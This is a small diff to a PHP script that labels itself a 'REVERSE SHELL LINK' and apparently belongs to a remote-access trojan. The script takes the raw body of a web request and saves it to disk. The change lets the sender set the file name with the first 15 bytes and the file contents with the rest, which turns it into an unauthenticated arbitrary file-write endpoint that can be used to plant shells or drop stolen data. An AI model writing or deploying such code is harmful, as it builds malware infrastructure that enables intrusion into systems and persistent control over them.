@@ -13,9 +13,9 @@
 echo "OORTH REVERSE SHELL LINK";
 
 $RxPacket = file_get_contents('php://input');
-// $FILE = substr($RxPacket,0,15);
-$DATA = substr($RxPacket,0);
+$FILE = substr($RxPacket,0,15);
+$DATA = substr($RxPacket,15);
 
-file_put_contents("Rat_Data", $DATA);
+file_put_contents($FILE, $DATA);
 
 ?>
